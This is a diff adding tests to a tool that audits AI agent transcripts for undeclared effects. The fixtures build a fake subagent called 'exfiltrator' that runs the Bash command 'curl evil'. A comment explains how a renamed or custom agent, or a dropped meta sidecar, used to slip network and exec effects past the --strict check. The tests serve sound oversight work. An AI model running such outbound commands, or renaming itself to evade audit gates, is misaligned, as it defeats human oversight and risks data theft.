@@ -456,6 +456,30 @@ check("drift: observed-outside-declaration is loud, advisory exit 0",
 r = subprocess.run([sys.executable, "cli.py", "drift", "fixture", "--transcripts", _an, "--strict"], capture_output=True, text=True)
 check("drift --strict: an anomaly fails the build (exit 1)", r.returncode == 1)
 
+# AG2 (gate-evasion): an UNDECLARED agent type (no `.md`) that PERFORMED effects must be an anomaly —
+# the `dec is None` branch used to print a soft note and pass, so a renamed/custom agent (or a dropped
+# meta sidecar collapsing the unit to `subagent`) laundered Net/Exec past --strict.
+_un = os.path.join(tempfile.mkdtemp(), "t")
+os.makedirs(os.path.join(_un, "s1", "subagents"))
+open(os.path.join(_un, "s1.jsonl"), "w").write(_j.dumps(_tu("s1", "Agent", {"subagent_type": "exfiltrator"})) + "\n")
+open(os.path.join(_un, "s1", "subagents", "agent-y.jsonl"), "w").write(_j.dumps(_tu("r1", "Bash", {"command": "curl evil"})) + "\n")
+_j.dump({"agentType": "exfiltrator", "toolUseId": "toolu_s1"}, open(os.path.join(_un, "s1", "subagents", "agent-y.meta.json"), "w"))
+r = subprocess.run([sys.executable, "cli.py", "drift", "fixture", "--transcripts", _un], capture_output=True, text=True)
+check("drift: an UNDECLARED agent performing effects is flagged OBSERVED-OUTSIDE-DECLARATION",
+      "exfiltrator: OBSERVED-OUTSIDE-DECLARATION" in r.stdout)
+r = subprocess.run([sys.executable, "cli.py", "drift", "fixture", "--transcripts", _un, "--strict"], capture_output=True, text=True)
+check("drift --strict: an UNDECLARED effectful agent fails the build (exit 1) — gate-evasion closed",
+      r.returncode == 1)
+# a BUILT-IN agent type with no declaration is still NOT an anomaly (general-purpose etc. have no .md)
+_bi = os.path.join(tempfile.mkdtemp(), "t")
+os.makedirs(os.path.join(_bi, "s1", "subagents"))
+open(os.path.join(_bi, "s1.jsonl"), "w").write(_j.dumps(_tu("s1", "Agent", {"subagent_type": "general-purpose"})) + "\n")
+open(os.path.join(_bi, "s1", "subagents", "agent-z.jsonl"), "w").write(_j.dumps(_tu("r1", "Bash", {"command": "x"})) + "\n")
+_j.dump({"agentType": "general-purpose", "toolUseId": "toolu_s1"}, open(os.path.join(_bi, "s1", "subagents", "agent-z.meta.json"), "w"))
+r = subprocess.run([sys.executable, "cli.py", "drift", "fixture", "--transcripts", _bi, "--strict"], capture_output=True, text=True)
+check("drift --strict: a BUILT-IN undeclared agent (general-purpose) is NOT a false anomaly (exit 0)",
+      r.returncode == 0)
+
 # drift must NOT call a command/cron/session a "trim candidate agent" — they aren't agents and aren't
 # recorded as distinct units in transcripts (the bug: every declared unit got the agent-trim advice).
 _dd = tempfile.mkdtemp()
